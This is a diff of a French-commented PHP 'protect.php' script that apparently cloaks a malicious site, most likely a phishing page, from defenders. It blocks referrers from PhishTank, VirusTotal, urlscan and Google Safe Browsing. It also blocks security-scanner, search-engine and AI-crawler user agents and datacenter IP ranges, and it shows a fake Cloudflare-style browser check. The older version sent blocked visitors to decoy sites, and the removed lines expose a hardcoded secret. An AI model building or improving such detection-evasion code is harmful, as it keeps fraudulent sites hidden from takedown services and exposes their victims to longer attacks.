@@ -1,13 +1,11 @@
 <?php
 declare(strict_types=1);
 
-// Protection anti-double exécution
 if (defined('PROTECT_LOADED')) return;
 define('PROTECT_LOADED', true);
 
 // ============================================================
-// protect.php – V8.3 ANTI-IA / ANTI-GOOGLE / ANTI-SCANNER
-// Mise à jour : mai 2026
+// protect.php – pour Railway (chemins /, secret unique)
 // ============================================================
 
 $ip   = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
@@ -16,12 +14,12 @@ $uri  = $_SERVER['REQUEST_URI'] ?? '/';
 
 $config = [
     'log_file'       => __DIR__ . '/data/protect_logs.txt',
-    'max_requests'   => 8,                          // baissé à 8 pour ralentir les scanners
+    'max_requests'   => 10,                          // 10 requêtes max / 5 min (sans cookie)
     'time_window'    => 300,
     'token_ttl'      => 600,
-    'secret'         => 'rT8zQ$kL3mN9pQrS5uVwXyZ1bCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdef',
-    'cookie_path'    => '/wb/',
-    'app_path'       => '/wb/',
+    'secret'         => 'CHANGEZ_MOI_PAR_UNE_PHRASE_DE_64_CARACTERES_ALEATOIRES',
+    'cookie_path'    => '/',                         // racine du site
+    'app_path'       => '/',
 ];
 
 function wLog($msg) {
@@ -50,11 +48,9 @@ $ref = parse_url($_SERVER['HTTP_REFERER'] ?? '', PHP_URL_HOST);
 $badRefs = [
     'urlscan.io','virustotal.com','hybrid-analysis.com','any.run',
     'joesandbox.com','cuckoosandbox.org','phishtank.com','google.com/safebrowsing',
-    'opendns.com','phishtank.com','malwarebytes.com','sophoslabs.com',
+    'opendns.com','malwarebytes.com','sophoslabs.com',
 ];
-foreach ($badRefs as $b) {
-    if ($ref && stripos($ref, $b) !== false) block("BAD_REFERER: $ref");
-}
+foreach ($badRefs as $b) if ($ref && stripos($ref, $b) !== false) block("BAD_REFERER: $ref");
 
 // 3. Honeypot paths
 $badPaths = [
@@ -65,47 +61,36 @@ $badPaths = [
 foreach ($badPaths as $p) if (stripos($uri, $p) === 0) block("HONEYPOT_PATH: $p");
 if (isset($_GET['trap']) && $_GET['trap'] === '1') block("TRAP");
 
-// 4. User‑Agents bloqués – NOUVEAUX ajouts IA et scanners récents
+// 4. User‑Agents bloqués (inchangé)
 if (empty(trim($ua))) block("EMPTY_UA");
 $badUAs = [
-    // Outils
     'curl','wget','python','go-http','node-fetch','axios/','postman','okhttp','httpclient',
-    // Headless / test
     'headless','phantomjs','selenium','puppeteer','playwright','cypress','scrapy','nutch',
-    // Scanners sécurité
     'urlscan.io','virustotal','hybrid analysis','falcon sandbox','cuckoosandbox','any.run',
     'joesandbox','vxstream','quttera','sitecheck','sitelock','netsparker','acunetix','appscan',
     'burp suite','nikto','sqlmap','gobuster','dirbuster','hydra','medusa','nessus','openvas',
     'wpscan','joomscan',
-    // Moteurs de recherche
     'googlebot','bingbot','msnbot','slurp','duckduckbot','yandex','baidu',
     'sogou','exabot','ahrefs','semrush','dotbot','blexbot','petalbot','grapeshot','mj12bot',
-    // ======= NOUVEAUX BOTS IA (2024-2026) =======
-    'gptbot','chatgpt-user','oai-searchbot','google-extended','claudebot','claude-user',
-    'anthropic-ai','perplexitybot','perplexity-user','gemini','emerald',
-    'cohere-ai','cohere','bytespider','bytedance','applebot',
+    'gptbot','chatgpt','oai-searchbot','google-extended','claudebot','claude-user','anthropic',
+    'perplexity','gemini','emerald','cohere','bytespider','bytedance','applebot',
     'amazonbot','slurp','duckassistbot','mataagent','klingbot','imrbot',
     'synthesiobot','percolate','scoutjet','meltwater','muckrack',
     'istellabot','seznambot','rogerbot','sputnik','mail.ru','lighthouse','pagespeed',
     'google-safebrowsing','google-security','google-cloud',
-    // Réseaux sociaux
     'facebookexternalhit','facebookbot','twitterbot','linkedinbot',
     'whatsapp','telegrambot','discordbot','slackbot',
-    // Autres crawlers
     'ccbot','commoncrawl','mojeekbot','exabot','blexbot',
 ];
 foreach ($badUAs as $b) if (stripos($ua, $b) !== false) block("UA_BOT: $b");
 
-// 5. Blocage IP (ajout des plages IA et Google supplémentaires)
-$googleRanges = ['34.','35.','36.','37.','38.','39.','40.','41.','42.','43.','44.',
-                 '45.','46.','47.','48.','49.','50.','51.','52.','53.','54.','55.',
-                 '56.','57.','58.','59.','60.','61.','62.','63.','64.','65.','66.',
-                 '67.','68.','69.','70.','71.','72.','73.','74.','75.','76.','77.',
-                 '78.','79.','80.','81.','82.','83.','84.','85.','86.','87.','88.',
-                 '89.','90.','91.','92.','93.','94.','95.','96.','97.','98.','99.'];
-$blockedPrefixes = array_merge($googleRanges, [
+// 5. Blocage IP – UNIQUEMENT DATACENTERS
+$blockedPrefixes = [
+    // Google Cloud
+    '34.','35.','104.196.','107.178.','130.211.','146.148.',
+    '162.216.','173.255.','192.158.','199.192.','23.236.','23.251.',
     // AWS
-    '3.','13.','18.','44.','52.','54.','67.','72.','96.','107.',
+    '3.','13.','18.','44.','52.','54.','67.','72.',
     // Azure
     '20.','40.','51.','104.40.','104.41.','104.42.','104.43.','104.44.','104.45.','104.46.',
     '13.64.','13.65.','13.66.',
@@ -120,52 +105,40 @@ $blockedPrefixes = array_merge($googleRanges, [
     // Linode, Vultr, OVH
     '66.228.','74.207.','139.162.','192.46.','198.58.','198.199.',
     '23.239.','23.92.','45.33.','45.56.','45.76.','45.79.',
-    // ======= NOUVELLES PLAGES IA  =======
-    '4.','5.','6.','8.','9.','11.','12.','14.','17.','19.','22.','24.','28.','29.',
-    '32.','33.','38.','40.','43.','46.','47.','48.','50.','53.','55.','56.','57.','58.',
-    '60.','61.','62.','64.','65.','66.','68.','69.','70.','71.','73.','74.','75.','76.',
-    '78.','79.','80.','81.','82.','83.','84.','85.','86.','87.','88.','89.','90.','91.',
-    '92.','93.','94.','95.','96.','97.','98.','99.','100.','101.','102.','103.',
-    '105.','106.','107.','108.','109.','110.','111.','112.','113.','114.','115.','116.',
-    '117.','118.','119.','120.','121.','122.','123.','124.','125.','126.','127.','128.',
-    '129.','130.','131.','132.','133.','134.','135.','136.','137.','138.','139.','140.',
-    '141.','142.','143.','144.','145.','146.','147.','148.','149.','150.',
-]);
+    // OVH (nouvelles plages)
+    '5.196.','51.68.','51.75.','51.77.','51.89.',
+    '54.36.','54.37.','54.38.','91.121.','92.222.',
+    '94.23.','151.80.','164.132.','167.114.',
+    '176.31.','178.32.','178.33.','188.165.',
+    '198.27.','198.100.',
+    // Oracle Cloud
+    '140.238.','140.239.','140.240.','140.241.',
+];
 foreach ($blockedPrefixes as $p) if (strpos($ip, $p) === 0) block("CLOUD_IP: $p*");
 
-// IPs spécifiques de scanners IA
+// IPs spécifiques de scanners
 $scannerIPs = [
     '34.90.230.222','34.91.113.62','34.255.40.101','34.255.132.115','34.255.142.34',
     '136.243.154.86','66.249.75.1','66.249.75.3','66.249.75.4','66.249.75.5',
-    // ======= IP OpenAI / ChatGPT =======
-    '23.98.142.','23.98.143.','13.64.','13.65.','13.66.','13.67.','13.68.','13.69.',
-    '13.70.','13.71.','13.72.','13.73.','13.74.','13.75.','13.76.','13.77.',
-    '20.42.','20.43.','20.44.','20.45.','20.46.','20.47.','20.48.','20.49.',
-    '40.76.','40.77.','40.78.','40.79.','40.80.','40.81.','40.82.','40.83.',
-    '52.152.','52.153.','52.154.','52.155.','52.156.','52.157.','52.158.','52.159.',
-    '52.224.','52.225.','52.226.','52.227.','52.228.','52.229.','52.230.','52.231.',
-    // ======= IP Perplexity / Anthropic =======
-    '34.83.','34.84.','34.85.','34.86.','34.87.','34.88.','34.89.',
-    '35.199.','35.200.','35.201.','35.202.','35.203.','35.204.','35.205.','35.206.',
-    '104.196.','107.178.','130.211.','146.148.','162.216.','173.255.','192.158.',
+    '35.187.132.162','52.14.59.76','3.145.198.136',
 ];
 foreach ($scannerIPs as $s) if ($ip === $s || strpos($ip, $s) === 0) block("SCANNER_IP: $s");
 
-// 6. Vérification du token (inchangée, liée à l'IP)
+// 6. Vérification du token (INDÉPENDANT DE L'IP)
 $tokenCookieName = '_phptok';
 $validToken = false;
 if (isset($_COOKIE[$tokenCookieName])) {
     $parts = explode('.', $_COOKIE[$tokenCookieName]);
-    if (count($parts) === 3) {
-        [$givenIP, $expire, $hmac] = $parts;
-        $expected = hash_hmac('sha256', "$givenIP.$expire", $config['secret']);
-        if (hash_equals($expected, $hmac) && $ip === $givenIP && time() < (int)$expire) {
+    if (count($parts) === 2) {                     // expire.hmac (plus d'IP)
+        [$expire, $hmac] = $parts;
+        $expected = hash_hmac('sha256', $expire, $config['secret']);
+        if (hash_equals($expected, $hmac) && time() < (int)$expire) {
             $validToken = true;
         }
     }
 }
 
-// 7. Si pas de token → rate limiting + défi JS AVEC HONEYPOT INVISIBLE
+// 7. Si pas de token → rate limiting + défi JS (simple)
 if (!$validToken) {
     $rlFile = sys_get_temp_dir() . '/rl_' . md5($ip . '_v8');
     $now = time();
@@ -184,17 +157,17 @@ if (!$validToken) {
 
     if ($data['count'] > $config['max_requests']) {
         wLog("⛔ RATE_LIMIT: {$data['count']} reqs (no token)");
-        sleep(2);
-        $fake = ['https://www.google.com','https://fr.wikipedia.org','https://www.service-public.fr'];
-        header('Location: ' . $fake[array_rand($fake)]);
+        // 404 simple, pas de redirection suspecte
+        http_response_code(404);
+        echo "Not Found";
         exit;
     }
 
-    // Défi JS
+    // Génération du token sans IP
     wLog("CHALLENGE -> $ip");
     $expire = time() + $config['token_ttl'];
-    $hmac   = hash_hmac('sha256', "$ip.$expire", $config['secret']);
-    $token  = "$ip.$expire.$hmac";
+    $hmac   = hash_hmac('sha256', (string)$expire, $config['secret']);
+    $token  = "$expire.$hmac";
 
     http_response_code(503);
     header('Cache-Control: no-store, no-cache, must-revalidate');
@@ -215,8 +188,6 @@ if (!$validToken) {
             @keyframes spin{to{transform:rotate(360deg);}}
             .cf-title{font-size:1.4rem;font-weight:500;margin-bottom:10px;}
             .cf-sub{font-size:0.95rem;color:#6c757d;line-height:1.5;}
-            /* HONEYPOT - invisible pour l'humain */
-            ._trap{position:absolute;left:-9999px;top:-9999px;visibility:hidden;}
         </style>
     </head>
     <body>
@@ -225,16 +196,10 @@ if (!$validToken) {
             <div class="cf-title">Vérification de votre navigateur…</div>
             <div class="cf-sub">Cette opération automatique prend quelques secondes.<br>Veuillez patienter, la page va se recharger.</div>
         </div>
-        <!-- Lien piège : tout robot qui scrappe le HTML le suit, sera bloqué -->
-        <a href="?trap=1" class="_trap" rel="nofollow">.</a>
+        <a href="?trap=1" style="display:none;" rel="nofollow">.</a>
         <script>
             (function() {
-                // Détection headless améliorée
                 if (navigator.webdriver) return;
-                if (window.outerWidth === 0 && window.outerHeight === 0) return; // headless typique
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl && gl.getParameter(37445) && gl.getParameter(37445).indexOf('SwiftShader') !== -1) return; // Chrome headless
                 document.cookie = "<?= $tokenCookieName ?>=<?= urlencode($token) ?>; path=<?= $config['cookie_path'] ?>; max-age=<?= $config['token_ttl'] ?>; SameSite=Lax";
                 setTimeout(function() {
                     window.location.reload(true);
@@ -249,10 +214,13 @@ if (!$validToken) {
 
 // 8. Renouvellement du cookie + nettoyage du compteur
 $expire = time() + $config['token_ttl'];
-$hmac   = hash_hmac('sha256', "$ip.$expire", $config['secret']);
-setcookie($tokenCookieName, "$ip.$expire.$hmac", [
-    'expires' => $expire, 'path' => $config['cookie_path'],
-    'samesite' => 'Lax', 'secure' => false, 'httponly' => true
+$hmac   = hash_hmac('sha256', (string)$expire, $config['secret']);
+setcookie($tokenCookieName, "$expire.$hmac", [
+    'expires'  => $expire,
+    'path'     => $config['cookie_path'],
+    'samesite' => 'Lax',
+    'secure'   => false,
+    'httponly' => true,
 ]);
 $rlFile = sys_get_temp_dir() . '/rl_' . md5($ip . '_v8');
 if (file_exists($rlFile)) @unlink($rlFile);
@@ -266,3 +234,4 @@ header('Referrer-Policy: no-referrer');
 header('X-Frame-Options: SAMEORIGIN');
 header("Content-Security-Policy: frame-ancestors 'self' https://{$_SERVER['HTTP_HOST']};");
 wLog("✅ PASSED (token OK)");
+?>
